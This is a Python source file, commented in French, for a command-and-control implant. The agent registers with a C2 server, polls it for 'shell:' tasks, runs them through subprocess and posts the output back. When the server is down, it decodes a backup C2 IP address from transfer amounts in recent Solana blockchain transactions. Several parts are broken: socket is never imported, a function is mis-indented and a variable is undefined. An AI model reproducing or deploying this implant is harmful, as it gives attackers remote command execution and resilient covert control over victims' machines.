import requests
import os
import time
import json
import subprocess

class Agent:
    """
    Classe représentant l'agent qui s'enregistre et effectue des tâches.
    """
    def __init__(self, hostname: str, ip: str, port: int, name: str, key: str):
        self.hostname = hostname
        self.ip = ip
        self.port = port
        self.name = name
        self.task_url = None
        self.result_url = None
        self.key = key

        self.register_data = {
            "name": self.name,
            "hostname": self.hostname,
            "ip": self.ip,
            "key": self.key
        }

        self.condition = {"User-Agent":"condition"}

    def register(self):
        """
        Enregistrer l'agent auprès du serveur C2.
        """
        regl = f"http://{self.ip}:{self.port}/register"
        response = requests.post(regl, json=self.register_data, headers=self.condition)
        if response.status_code == 200:
            self.name = response.text.strip()
            self.task_url = f"http://{self.ip}:{self.port}/getTask?agent={self.name}"
            self.result_url = f"http://{self.ip}:{self.port}/receiveResult"
            print(f"Agent registered with name: {self.name}")
        else:
            print(f"Failed to register agent: {response.status_code}")

    def wait_for_task(self):
        """
        Boucle infinie pour vérifier les tâches et les traiter.
        """
        time.sleep(3)
        task_response = requests.get(self.task_url)
        if task_response.status_code == 204:
            print("No task available.")
        else:
            print(f"Task received: {task_response.text}")
            self.handle_task(task_response.text)

    def handle_task(self, task):
        """
        Traiter la tâche reçue.
        """
        # Implémentation de la logique pour gérer la tâche reçue
        print(f"Handling task: {task}")
        task = task.split(":")
        if task[0] == "shell":
            command = task[1].split()
            result = subprocess.run(command, capture_output=True, text=True)
            result = result.stdout
            self.send_task(result)  
        
    def send_task(self,result):
        payload = {
            "agent" : self.name,
            "result" : result
            }
        headers = {"Content-Type" : "application/json"}
        task_result = requests.post(self.result_url, json=payload, headers=headers)
        print(task_result.status_code)

    def retrieve_transaction(self, wallet_addr):
        """
        Cette fonction retrouve les signatures des deux dernières transactions sur la wallet.
        """
        signature_list = []
        data = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getSignaturesForAddress",
            "params": [
                wallet_addr,
                {
                    "limit": 2
                }
            ]
        }
        res = requests.post(url="https://api.mainnet-beta.solana.com",json=data)
        json_res = res.json()
 
        try:
            for i in json_res['result']:
                signature_list.append(i['signature'])
        except KeyError:
            return 0

        return signature_list
    
    def retrieve_backup_ip(self, signature_list):
        """
        Cette fonction utilise les signatures de deux dernières transactions,
        pour retrouver les sommes envoyées sur le wallet.
        """
        ip_address = ""

        i = 0 
        for signature in signature_list:
            data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTransaction",
                "params" : [
                    signature,
                    {
                        "commitment": "confirmed",
                        "maxSupportedTransactionVersion": 0,
                        "encoding" : "json"
                    }
                ]
            }
            res = requests.post(url="https://api.mainnet-beta.solana.com", json=data)
            json_res = res.json()
            
            try:
                amount_send = json_res['result']['meta']['postBalances'][1] - json_res['result']['meta']['preBalances'][1]
                ip_byte = hex(amount_send // 1000)
                ip_byte = hex(int(ip_byte,16) ^ 0xffff)
                ip_address = ip_address + str(int(ip_byte[:4], 16)) + "."
                if i == 0:
                    ip_address = ip_address + str(int(ip_byte[4:6], 16)) + "."
                else:
                    ip_address = ip_address + str(int(ip_byte[4:6], 16))
            except KeyError:
                return 0
            i += 1

        return ip_address

    def tester_connexion_serveur(hote: str, port: int, timeout: float = 5.0) -> bool:
    """
    Tente de se connecter à un serveur donné sur un port spécifié.

    :param hote: Adresse IP ou nom de domaine du serveur (ex: "google.com").
    :param port: Port de connexion (ex: 80 pour HTTP).
    :param timeout: Délai d’attente en secondes avant abandon (par défaut : 5.0s).
    :return: True si la connexion est possible, False sinon.
    """
    try:
        with socket.create_connection((hote, port), timeout=timeout):
            return True
    except (socket.timeout, socket.error):
        return False
   
def main():
    WALLET = "CUSTOM_WALLET"
    IP = "IP"
    PORT = "PORT"
    KEY = "CUSTOM_KEY"
    NAME = "CUSTOM_NAME"
    hostname = os.uname()[1]
    agent = Agent(hostname, IP, PORT, NAME, KEY)

    # Enregistrer l'agent
    agent.register()
    while True:
        is_up = tester_connexion_serveur(IP,PORT,10.0)
        
        if not is_up:
            signature_list = agent.retrieve_transaction(wallet_addr)
            if signature_list != 0:
                backup_ip = agent.retrieve_backup_ip(signature_list)
                agent.ip = backup_ip

        # Attendre et gérer les tâches
        agent.wait_for_task()

if __name__ == "__main__":
    main()

